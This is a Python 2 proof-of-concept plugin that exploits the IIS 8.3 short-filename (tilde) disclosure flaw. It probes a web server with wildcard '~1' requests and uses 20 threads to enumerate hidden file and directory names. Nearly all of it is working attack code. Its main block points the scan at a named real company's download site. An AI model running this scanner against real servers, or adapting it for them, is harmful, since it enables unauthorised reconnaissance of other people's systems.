#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import httplib
import urlparse
import threading
import Queue

from poc.poc_base import POCBase
from poc.poc_base import Output


class PocRealizeClass(POCBase):
    CHvulID = '00001'
    name = 'IIS 8.3 name'
    version = '1.0'
    author = ['Lightning']
    vulDate = ''
    createDate = '2017.0404'
    updateDate = ''

    references = []
    vulType = ''
    componentsName = 'IIS'
    componentsVersion = ''
    componentsPowerLink = ''
    samples = ['']
    requirements = ['requests']
    desc = ''''''
    memo = ''''''

    def _attack(self, scanner):
        assert isinstance(scanner, Scanner)
        scanner.run()
        scanner.dirs.extend(scanner.files)
        return scanner.dirs

    def _verify(self):
        result = {}
        s = Scanner(self.url)
        if s.is_vul():
            file_or_dir_list = self._attack(s)
            if file_or_dir_list:
                result['res'] = file_or_dir_list
                result['payload'] = ''
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


class Scanner():
    def __init__(self, target):
        self.target = target.lower()
        self.scheme, self.netloc, self.path, params, query, fragment = \
                     urlparse.urlparse(target)
        if self.path[-1:] != '/':
            self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = Queue.Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = ''
        self.msg_queue = Queue.Queue()
        self.STOP_ME = False
        # threading.Thread(target=self._print).start()

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc, timeout=10)
            else:
                conn = httplib.HTTPConnection(self.netloc, timeout=10)
            return conn
        except Exception, e:
            print '[_conn.Exception]', e
            return None

    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request(self.request_method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception, e:
            raise Exception('[_get_status.Exception] %s' % str(e) )

    def is_vul(self):
        try:
            for _method in ['GET', 'OPTIONS']:
                self.request_method = _method
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
                if status_1 == 404 and status_2 != 404:
                    return True
            return False
        except Exception, e:
            raise Exception('[is_vul.Exception] %s' % str(e) )

    def run(self):
        for c in self.alphanum:
            self.queue.put((self.path + c, '.*'))    # filename, extension
        for i in range(20):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        for t in self.threads:
            t.join()
        self.STOP_ME = True

    # def report(self):
    #     print '-'* 64
    #     for d in self.dirs:
    #         print 'Dir:  %s' % d
    #     for f in self.files:
    #         print 'File: %s' % f
    #     print '-'*64
    #     print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
    #     print 'Note that * is a wildcard, matches any character zero or more times.'

    # def _print(self):
    #     while not self.STOP_ME or (not self.msg_queue.empty()):
    #         if self.msg_queue.empty():
    #             time.sleep(0.05)
    #         else:
    #             print self.msg_queue.get()

    def _scan_worker(self):
        while True:
            try:
                # /a  .*
                url, ext = self.queue.get(timeout=1.0)
                # print url + '*~1' + ext + '/1.aspx'
                # /a*~1.*/1.aspx
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))
                    # 先检测文件'~1'前的6个字符
                    # /abcdef~1.*/1.aspx   /
                    if len(url) - len(self.path)< 6:    # enum first 6 chars only
                        for c in self.alphanum:
                            self.queue.put( (url + c, ext) )
                    else:
                        # 如果字符长度为6个,说明前6个字符检测完毕
                        if ext == '.*':
                            # 先判断是否存在此路径，将文件名后缀去掉进行检测
                            self.queue.put( (url, '') )
                        # 检测到有6字符个长度的路径
                        if ext == '':
                            # 将此路径加入结果列表
                            self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')

                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
                            # 如果后缀长度为4 或不为*结尾，则检测出文件名称
                            # 超过4则不再检测
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')

                        else:
                            # 开始检测文件的后缀
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put( (url, ext[:-1] + c + '*') )
                                if len(ext) < 4:    # < len('.as*')
                                    self.queue.put( (url, ext[:-1] + c) )
            except Queue.Empty,e:
                break
            except Exception, e:
                print '[Exception]', e


if __name__ == '__main__':
    poc = PocRealizeClass()
    res = poc.execute(target='http://download.changhong.com/')
    #print res.status
    print res.show_result()


